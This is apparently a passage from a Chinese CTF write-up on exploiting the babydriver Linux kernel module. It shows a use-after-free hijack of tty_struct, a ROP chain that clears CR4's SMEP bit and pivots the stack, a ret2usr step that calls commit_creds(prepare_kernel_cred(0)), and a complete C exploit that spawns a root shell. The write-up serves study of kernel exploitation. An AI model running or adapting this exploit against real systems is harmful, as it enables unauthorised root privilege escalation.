<p>第一种方法比较难想，虽然看样子很简单，但是第二种解法就属于比较常规的了。因为该内核开启了smep保护，所以我们可以想办法绕过该保护来达到提权。该保护的作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误。</p>
<p>如何绕过：</p>
<p>因为系统是根据cr4寄存器的第20位来判断内核是否开启了smep，为1时开启，为0时关闭，所以绕过方法就是将第20位置0，但是该寄存器的值无法直接查看，只能通过kernel crash时产生的信息查看：</p>
<blockquote>
<p>mov cr4,0x6f0</p>
</blockquote>
<p>如何提取该rop：</p>
<p>因为vmlinux未经压缩，所以可以通过vmlinux来提取rop：</p>
<blockquote>
<p>ROPgadget —binary ./vmlinux &gt; g2</p>
<p>或用ropper</p>
<p>ropper –file ./vmlinux –nocolor &gt; g1</p>
</blockquote>
<p>该方法利用的是一个蛮有意思的一个结构体，为<code>tty_struct</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">struct tty_struct &#123;</span><br><span class="line">    int magic;</span><br><span class="line">    struct kref kref;</span><br><span class="line">    struct device *dev;</span><br><span class="line">    struct tty_driver *driver;</span><br><span class="line">    const struct tty_operations *ops;     &lt; -- 这里</span><br><span class="line">    int index;</span><br><span class="line">    /* Protects ldisc changes: Lock tty not pty */</span><br><span class="line">    struct ld_semaphore ldisc_sem;</span><br><span class="line">    struct tty_ldisc *ldisc;</span><br><span class="line">    struct mutex atomic_write_lock;</span><br><span class="line">    struct mutex legacy_mutex;</span><br><span class="line">    struct mutex throttle_mutex;</span><br><span class="line">    struct rw_semaphore termios_rwsem;</span><br><span class="line">    struct mutex winsize_mutex;</span><br><span class="line">    spinlock_t ctrl_lock;</span><br><span class="line">    spinlock_t flow_lock;</span><br><span class="line">    /* Termios values are protected by the termios rwsem */</span><br><span class="line">    struct ktermios termios, termios_locked;</span><br><span class="line">    struct termiox *termiox;    /* May be NULL for unsupported */</span><br><span class="line">    char name[64];</span><br><span class="line">    struct pid *pgrp;       /* Protected by ctrl lock */</span><br><span class="line">    struct pid *session;</span><br><span class="line">    unsigned long flags;</span><br><span class="line">    int count;</span><br><span class="line">    struct winsize winsize;     /* winsize_mutex */</span><br><span class="line">    unsigned long stopped:1,    /* flow_lock */</span><br><span class="line">              flow_stopped:1,</span><br><span class="line">              unused:BITS_PER_LONG - 2;</span><br><span class="line">    int hw_stopped;</span><br><span class="line">    unsigned long ctrl_status:8,    /* ctrl_lock */</span><br><span class="line">              packet:1,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - 9;</span><br><span class="line">    unsigned int receive_room;  /* Bytes free for queue */</span><br><span class="line">    int flow_change;</span><br><span class="line">    struct tty_struct *link;</span><br><span class="line">    struct fasync_struct *fasync;</span><br><span class="line">    wait_queue_head_t write_wait;</span><br><span class="line">    wait_queue_head_t read_wait;</span><br><span class="line">    struct work_struct hangup_work;</span><br><span class="line">    void *disc_data;</span><br><span class="line">    void *driver_data;</span><br><span class="line">    spinlock_t files_lock;      /* protects tty_files list */</span><br><span class="line">    struct list_head tty_files;</span><br><span class="line">#define N_TTY_BUF_SIZE 4096</span><br><span class="line">    int closing;</span><br><span class="line">    unsigned char *write_buf;</span><br><span class="line">    int write_cnt;</span><br><span class="line">    /* If the tty has a pending do_SAK, queue it here - akpm */</span><br><span class="line">    struct work_struct SAK_work;</span><br><span class="line">    struct tty_port *port;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中有一个很有用的结构体<code>tty_operations</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">struct tty_operations &#123;</span><br><span class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">            struct file *filp, int idx);</span><br><span class="line">    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    int  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    void (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    int  (*write)(struct tty_struct * tty,</span><br><span class="line">              const unsigned char *buf, int count);</span><br><span class="line">    int  (*put_char)(struct tty_struct *tty, unsigned char ch);</span><br><span class="line">    void (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    int  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    int  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    int  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            unsigned int cmd, unsigned long arg);</span><br><span class="line">    long (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 unsigned int cmd, unsigned long arg);</span><br><span class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    void (*throttle)(struct tty_struct * tty);</span><br><span class="line">    void (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    void (*stop)(struct tty_struct *tty);</span><br><span class="line">    void (*start)(struct tty_struct *tty);</span><br><span class="line">    void (*hangup)(struct tty_struct *tty);</span><br><span class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</span><br><span class="line">    void (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    void (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</span><br><span class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</span><br><span class="line">    int (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    int (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            unsigned int set, unsigned int clear);</span><br><span class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    int (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line">#ifdef CONFIG_CONSOLE_POLL</span><br><span class="line">    int (*poll_init)(struct tty_driver *driver, int line, char *options);</span><br><span class="line">    int (*poll_get_char)(struct tty_driver *driver, int line);</span><br><span class="line">    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);</span><br><span class="line">#endif</span><br><span class="line">    int (*proc_show)(struct seq_file *, void *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>其中有着许多的函数指针，所以说对于我们构造rop来说就非常有用。</p>
<ul>
<li>如何调用这个结构体？</li>
</ul>
<p>当<code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code>时会创建一个tty_struct。</p>
<ul>
<li>如何使用tty_operations中的函数指针？</li>
</ul>
<p>往上面所open的文件中write就会调用其中的<code>int  (*write)(struct tty_struct * tty,const unsigned char *buf, int count);</code>函数，依次类推。</p>
<p>所以我们该如何去构造呢。根据上文的UAF利用可以很容易想到，我们一样可以利用UAF构造大小和tty_struct一样的空间去存储新建的tty_struct，从而达到修改tty结构体的效果，并且自行构造出<code>tty_operations</code>，修改其中的函数为我们的rop，从而在调用函数时成功劫持程序流到我们所构造的rop中。</p>
<p>先构造修改<code>const struct tty_operations *ops;</code>为fake_tty_operations：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int fd3 = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);</span><br><span class="line"></span><br><span class="line">unsigned long fake_tty_str[3] = &#123;0&#125;;</span><br><span class="line">read(fd2,fake_tty_str,32);            //读取前三组，保证和原先一样</span><br><span class="line">fake_tty_str[3] = fake_tty_opera;     //修改为fake_tty_operations</span><br><span class="line">//printf(&quot;fake_tty_opera:%x&quot;,fake_tty_opera);</span><br><span class="line">write(fd2,fake_tty_str,32);</span><br></pre></td></tr></table></figure>
<p>这里我们利用修改write来劫持程序流，write通过上面查得在第八组的位置，所以我们在第八组的位置构造上我们的rop，但是这里有一个问题就是，当劫持到我们rop时，此时的栈不是我们所构造的栈，是内核态的栈，我们没办法继续执行下去：</p>
<p>我起初这样构造<code>fake_tty_opera</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned long fake_tty_opera[30] = &#123;</span><br><span class="line">    0xffffffff810d238d,  // pop rdi ; ret</span><br><span class="line">    0x6f0,</span><br><span class="line">    0xffffffff81004d80,  // mov cr4, rdi ; pop rbp ; ret</span><br><span class="line">    0,</span><br><span class="line">    0xffffffff8100ce6e,  // pop rax ; ret</span><br><span class="line">    rop,</span><br><span class="line">    0xFFFFFFFF8181BFC5,</span><br><span class="line">    0xffffffff8100ce6e,  // pop rax ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当执行write函数时，会跳转到<code>0xffffffff8100ce6e</code>处的fake_write执行，此时的状态如下：</p>
<p><img src="/kernel_pwn1/6D673E58-8B02-4DAB-97A4-1BA821B829BC.png" alt="6D673E58-8B02-4DAB-97A4-1BA821B829BC"></p>
<p>此时需要我们把内核态的栈转化到我们构造的rop中去，<strong>因为此时rax寄存器中存储着我们所构造的fake_tty_opera</strong>，所以可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rax</span><br><span class="line">xchg rsp,rax</span><br></pre></td></tr></table></figure>
<p>来将栈转换到用户态来，如此可以自由构造rop。我们来栈回溯看看情况：</p>
<p>当我们调用write的时候，会执行到我们构造的fake_tty_opera中的write函数偏移为8组的位置：</p>
<p><img src="/kernel_pwn1/EA677783-AF64-43F6-84E7-66132201FD7F.png" alt="EA677783-AF64-43F6-84E7-66132201FD7F"></p>
<p>可以很容易从上面看出程序的执行流程。</p>
<p>所以把rop改改，改成这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned long fake_tty_opera[30] = &#123;</span><br><span class="line">    0xffffffff810d238d,  // pop rdi ; ret</span><br><span class="line">    0x6f0,</span><br><span class="line">    0xffffffff81004d80,  // mov cr4, rdi ; pop rbp ; ret</span><br><span class="line">    0,</span><br><span class="line">    0xffffffff8100ce6e,  // pop rax ; ret</span><br><span class="line">    rop,</span><br><span class="line">    0xFFFFFFFF8181BFC5,</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>即可转换内核态栈到用户态。</p>
<p>因为fake_tty_opera可供我们利用的空间太小，所以我们需要跳出去重新构造一个大空间的rop链。上面的rop已经完成了cr4寄存器的更改，即关闭了smep保护。接下来rop所要做的任务就是调用<code>commit_creds(prepare_kernel_cred(0))</code>函数来提权。这里因为已经关闭了smep所以可以直接用ret2usr方法来提权，后面构造的rop如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unsigned long rop[30] = &#123;</span><br><span class="line">    getroot,</span><br><span class="line">    0xffffffff81063694,  // swapgs ; pop rbp ; ret</span><br><span class="line">    0,</span><br><span class="line">    0xffffffff814e35ef,  // iretq; ret;</span><br><span class="line">    getshell,</span><br><span class="line">    user_cs,</span><br><span class="line">    user_flag,</span><br><span class="line">    user_rsp,</span><br><span class="line">    user_ss</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是这部分的rop和上部分的rop的栈也是不同的，所以在上部分的rop中也是需要栈迁移到第二部分的rop栈中去。接下来就是常规的getroot权限后，从内核态返回用户态再执行getshell的操作。这里有一个坑点就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不能将unsigned long rop[30]设置为unsigned long rop[]</span><br><span class="line">不然会出现数组里的内容发生改变的效果，具体像这样：</span><br></pre></td></tr></table></figure>
<p><img src="/kernel_pwn1/DBD3EC21-0C10-4423-8105-0AE0DC5432CF.png" alt="DBD3EC21-0C10-4423-8105-0AE0DC5432CF"></p>
<p>但是执行完<code>dec ebx</code>之后就变为：</p>
<p><img src="/kernel_pwn1/586CFD09-A9B6-4022-B3E4-35EFE1BCCBD6.png" alt="586CFD09-A9B6-4022-B3E4-35EFE1BCCBD6"></p>
<p>导致执行到getroot函数时执行的并不是真实地址，发生crash。但是我一直没弄明白为什么一个只对<code>ebx</code>寄存器产生影响的汇编句就把rop中的内容给改变了。但是限定上数组空间大小后就不会发生这样的情况。如有明白的请告诉我，感激不尽。</p>
<p>该方法主要介绍如何利用tty_struct利用UAF，并且利用tty_struct去bypass-smep保护，劫持程序流。不懂后面介绍的rop构造没关系，可以在下一篇文章中得到详细解答。</p>
<h4 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long user_cs,user_ss,user_rsp,user_flag;</span><br><span class="line">unsigned long prepare_kernel_cred = 0xffffffff810a1810;</span><br><span class="line">unsigned long commit_creds = 0xffffffff810a1420;</span><br><span class="line"></span><br><span class="line">void save_state()&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">            &quot;mov user_cs,cs;&quot;</span><br><span class="line">            &quot;mov user_ss,ss;&quot;</span><br><span class="line">            &quot;mov user_rsp,rsp;&quot;</span><br><span class="line">            &quot;pushf;&quot;</span><br><span class="line">            &quot;pop user_flag;&quot;</span><br><span class="line">           );</span><br><span class="line">    puts(&quot;[*] save the state success!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getshell()&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getroot()&#123;</span><br><span class="line">    char* (*pkc)(int) = prepare_kernel_cred;</span><br><span class="line">    void (*cc)(char*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(0));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line">    </span><br><span class="line">    unsigned long rop[] = &#123;</span><br><span class="line">        getroot,</span><br><span class="line">        0xffffffff81063694,  // swapgs ; pop rbp ; ret</span><br><span class="line">        0,</span><br><span class="line">        0xffffffff814e35ef,  // iretq; ret;</span><br><span class="line">        getshell,</span><br><span class="line">        user_cs,</span><br><span class="line">        user_flag,</span><br><span class="line">        user_rsp,</span><br><span class="line">        user_ss</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    unsigned long fake_tty_opera[30] = &#123;</span><br><span class="line">        0xffffffff810d238d,  // pop rdi ; ret</span><br><span class="line">        0x6f0,</span><br><span class="line">        0xffffffff81004d80,  // mov cr4, rdi ; pop rbp ; ret</span><br><span class="line">        0,</span><br><span class="line">        0xffffffff8100ce6e,  // pop rax ; ret</span><br><span class="line">        rop,</span><br><span class="line">        0xFFFFFFFF8181BFC5,</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">        0xFFFFFFFF8181BFC5,  // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    int fd1 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">    int fd2 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,0x10001,0x2e0);</span><br><span class="line"></span><br><span class="line">    //printf(&quot;rop:%x&quot;,rop);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    int fd3 = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    unsigned long fake_tty_str[3] = &#123;0&#125;;</span><br><span class="line">    read(fd2,fake_tty_str,32);</span><br><span class="line">    fake_tty_str[3] = fake_tty_opera;</span><br><span class="line">    //printf(&quot;fake_tty_opera:%x&quot;,fake_tty_opera);</span><br><span class="line">    write(fd2,fake_tty_str,32);</span><br><span class="line"></span><br><span class="line">    write(fd3,&quot;V1NKe&quot;,5);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="提权：-1"><a href="#提权：-1" class="headerlink" title="提权："></a>提权：</h4><p><img src="/kernel_pwn1/2A18BFB9-60AB-4809-AE4D-CCEB078EE17B.png" alt="2A18BFB9-60AB-4809-AE4D-CCEB078EE17B"></p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul>
<li><a href="http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></li>
<li><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</a></li>
<li><a href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html" target="_blank" rel="noopener">https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html</a></li>
<li><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a></li>
</ul>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持v1nke</div>
        <ul>
        
          <li class="item">
            <span>微信扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>支付宝扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2019/03/02/2018HCTF-Christmas/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2019/03/25/kernel_pwn2/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
